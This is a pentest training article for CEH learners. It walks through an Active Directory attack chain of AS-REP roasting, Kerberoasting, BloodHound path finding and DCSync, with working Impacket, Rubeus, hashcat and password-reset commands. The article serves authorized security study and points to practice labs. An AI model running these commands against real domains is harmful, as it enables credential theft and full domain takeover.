# 17 — Active Directory Attack Chain: Kerberoasting + AS-REP + BloodHound

- **Source:** Original — written specifically to close the AD gap in CEH v13 content. CEH underweights Active Directory, but ~95% of internal pentests live or die on AD tradecraft. This article is the on-ramp that the curriculum proper deliberately leaves to here.
- **Author:** [@SaharBarak](https://github.com/SaharBarak) (CEH Prep)
- **Curriculum mapping:** **CEH v13 Day 06 — System Hacking** (lateral movement extension) · post-cert track
- **GitHub repos:**
  - [`SpecterOps/BloodHound`](https://github.com/SpecterOps/BloodHound) — the graph database that makes AD attack paths visible
  - [`SpecterOps/BloodHound.py`](https://github.com/SpecterOps/BloodHound.py) — Python-based collector (no .NET / no Windows host needed)
  - [`fortra/impacket`](https://github.com/fortra/impacket) — `GetUserSPNs.py`, `GetNPUsers.py`, `secretsdump.py`, `psexec.py`
  - [`GhostPack/Rubeus`](https://github.com/GhostPack/Rubeus) — Windows-native Kerberos toolkit (kerberoast, asreproast, ticket manipulation)
- **External references:**
  - [SpecterOps "Roasting AS-REPs"](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) — Will Schroeder's original AS-REP write-up
  - [HackTricks: Pentesting Kerberos 88](https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88)

---

## Why this article exists

The CEH v13 curriculum touches Active Directory in a single concept card on Day 6 (NTLM pass-the-hash). On a real internal engagement, that's about 3% of what you'll actually use. Kerberos abuse, BloodHound path enumeration, AD CS certificate forgery, DCSync, constrained delegation — these are the load-bearing skills.

You don't need any of this to pass the CEH exam. You **do** need all of it to do an internal AD assessment without embarrassing yourself. This article is the bridge.

---

## The 4-step low-noise AD chain

A common foothold-to-domain-admin path that works without dropping a beacon, without running any binary on a domain controller, and without triggering most AV/EDR baselines:

```
  1. Authenticated foothold (any low-priv user)
        │
        ▼
  2. AS-REP roast (no preauth required → offline crack)
        │
        ▼
  3. Kerberoast (SPN-bound service accts → offline crack)
        │
        ▼
  4. BloodHound path: cracked user → DA via known abuse edges
```

Each step uses only Kerberos / LDAP — protocols you can't block without breaking the domain.

---

## Step 1 — Find AS-REP-roastable users

**What it is.** Some AD accounts have "Do not require Kerberos preauthentication" set (`UF_DONT_REQUIRE_PREAUTH` in `userAccountControl`). You can request a TGT for them *without authenticating first*. The KDC returns a TGT encrypted with the account's password hash — which means you can crack it offline.

**Why this exists.** Legacy app compatibility (NTLM-only clients, old service migrations). It's rare in greenfield 2025 environments; common in environments older than 5 years. Look for it.

**Find them (no creds required, just a TCP path to a DC):**

```bash
# Impacket from Linux/WSL
GetNPUsers.py contoso.local/ -no-pass -usersfile /tmp/users.txt -outputfile /tmp/asrep.hash

# Rubeus from a Windows host (auth-required — uses your current session)
Rubeus.exe asreproast /nowrap /outfile:asrep.hash
```

`GetNPUsers.py` works unauthenticated when you have a username list. The `-usersfile` is the load-bearing input — you typically build it from LinkedIn scraping + a username convention guess (`first.last`, `flast`, `firstl`).

**Crack the hash.**

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

Mode `18200` = "Kerberos 5 AS-REP, etype 23 (RC4)". The output is the user's plaintext password.

---

## Step 2 — Kerberoast SPN-bound service accounts

**What it is.** Any domain user can request a service ticket (TGS) for any account with a registered Service Principal Name (SPN). The TGS is encrypted with the *service account's* NT hash, so you crack it offline. Service accounts are notorious for weak passwords because they're set once and forgotten.

**Find SPNs (creds required — use the AS-REP-cracked user from Step 1):**

```bash
# Impacket — full TGS extraction in one shot
GetUserSPNs.py contoso.local/svc_low:RECOVERED_PASSWORD -dc-ip 10.1.0.10 -request -outputfile /tmp/krb.hash

# Rubeus — Windows-native
Rubeus.exe kerberoast /outfile:krb.hash
```

**Crack:**

```bash
hashcat -m 13100 krb.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
```

Mode `13100` = "Kerberos 5 TGS-REP, etype 23". A weak service account password drops in seconds.

---

## Step 3 — BloodHound the path

**What it is.** BloodHound ingests AD object relationships (group memberships, ACLs, sessions, GPO links, trust edges) and renders them as a graph. You query the graph for paths like "shortest route from `[email protected]` to `Domain Admins`" and BloodHound returns the exact edge chain — every group hop, every GenericAll grant, every "logged in here" session.

**Collect.**

```bash
# Linux/WSL — no AD-joined host needed
bloodhound-python -c All -u svc_low -p 'RECOVERED_PASSWORD' -d contoso.local -ns 10.1.0.10

# Windows (SharpHound)
SharpHound.exe -c All
```

This produces `.json` files. Drag them into the BloodHound UI (Neo4j-backed).

**The killer query:**

```
MATCH p=shortestPath((u:User {name:"[email protected]"})-[*1..]->(t:Group {name:"DOMAIN ADMINS@CONTOSO.LOCAL"}))
RETURN p
```

The graph will surface abuse edges you'd never have noticed by hand:

- **GenericAll on an OU** → reset any password in that OU.
- **AddSelf on a group** → join yourself to a privileged group.
- **WriteDACL on an object** → grant yourself any right.
- **ForceChangePassword on an admin** → game over without needing the admin's current creds.
- **AllowedToDelegate** → constrained delegation abuse; lets you act as any user.

---

## Step 4 — Execute the path

Each edge has a documented abuse technique. The BloodHound UI shows you the exact command. A few examples:

**ForceChangePassword edge:**
```bash
# Samba's net rpc — works from any Linux/WSL with SMB to a DC
net rpc password "victim_admin" "NewPassword123!" -U contoso/svc_low%RECOVERED -S dc.contoso.local

# Impacket's changepasswd.py — newer SAMR-based equivalent
changepasswd.py -newpass 'NewPassword123!' contoso/svc_low:RECOVERED@dc.contoso.local -altuser victim_admin
```

**GenericAll on a user:**
```bash
# Set their SPN, kerberoast them, crack offline
addspn.py -u svc_low -p RECOVERED 'contoso.local/CN=victim,...' -s 'cifs/fake.contoso.local'
GetUserSPNs.py contoso.local/svc_low:RECOVERED -request-user victim
```

**DCSync (from a user with the Replicating Directory Changes right):**
```bash
secretsdump.py -dc-ip 10.1.0.10 -just-dc contoso.local/da_user:DA_PASS@dc.contoso.local
```

DCSync gives you every password hash in the domain, including the KRBTGT hash. With KRBTGT you forge Golden Tickets and persist forever. Don't do this on a real engagement without a written report-clause covering it.

---

## What this opens up

This chain — AS-REP → Kerberoast → BloodHound → abuse — is the foundation of every modern internal pentest. The skills extend directly into:

- **AD CS abuse** (Certipy: ESC1-ESC11) — certificate template misconfigurations that grant domain admin via a single cert request. Currently the highest-frequency internal finding industry-wide.
- **Constrained / unconstrained delegation** — abuse `S4U2Self` / `S4U2Proxy` to impersonate any user.
- **NTLM relay** (`ntlmrelayx.py`, `responder`) — coerce a privileged machine to authenticate to you, relay the auth to LDAP/SMB.
- **PetitPotam / DFSCoerce / PrinterBug** — force any machine to coerce authentication to your relay.
- **Resource-Based Constrained Delegation (RBCD)** — escalate a single machine compromise to domain admin via the `AllowedToActOnBehalfOfOtherIdentity` attribute.

If you want to keep going after CEH, the next stops are:

- **TCM Security PNPT** ($299) — Practical Network Penetration Tester. AD-heavy from the first lab. Open-book 5-day exam culminating in a real-engagement-style report. Probably the highest skill-per-dollar cert in the industry.
- **HackTheBox Academy Bug Bounty Hunter / CRTP** — guided AD attack paths with live targets.
- **OffSec PEN-200 (OSCP)** — only if a hiring manager specifically requires it.

---

## Lab the chain locally

You can practice this entire chain on a free local AD:

- **GOAD** (Game Of Active Directory) — a ready-to-deploy vulnerable AD lab. Three domains, intentional misconfigurations covering every step above. https://github.com/Orange-Cyberdefense/GOAD
- **HackTheBox "Resolute" / "Forest" / "Cascade"** — retired boxes with the exact chain.
- **TryHackMe "Attacktive Directory"** — beginner walkthrough of AS-REP + kerberoast + BloodHound.

You won't pay anything beyond a VPN connection.

---

## The honest framing

This article is not on the CEH v13 exam. You don't need it to pass. It's here because the curriculum proper is faithful to a certification that underweights what 95% of your actual offensive-security work will involve. The product gets you the cert; this is the bridge to the work.
